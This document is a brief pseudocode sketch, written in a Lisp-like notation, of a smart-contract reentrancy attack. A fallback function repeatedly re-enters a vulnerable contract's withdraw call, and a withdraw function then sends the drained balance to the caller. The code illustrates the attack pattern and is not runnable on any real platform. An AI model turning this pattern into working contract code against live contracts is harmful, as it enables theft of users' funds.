(define (reentrancy-attack vulnerable-contract)
    (define (attack)
        (let ((value (message-data)))
            (call vulnerable-contract "withdraw" (list value))))

    (define (fallback)
        (let ((value (message-value)))
            (call vulnerable-contract "withdraw" (list value))))

    (define (withdraw)
        (assert (equal? (sender) (tx-origin)) "Only externally owned accounts can withdraw")
        (transfer (sender) (balance)))
)
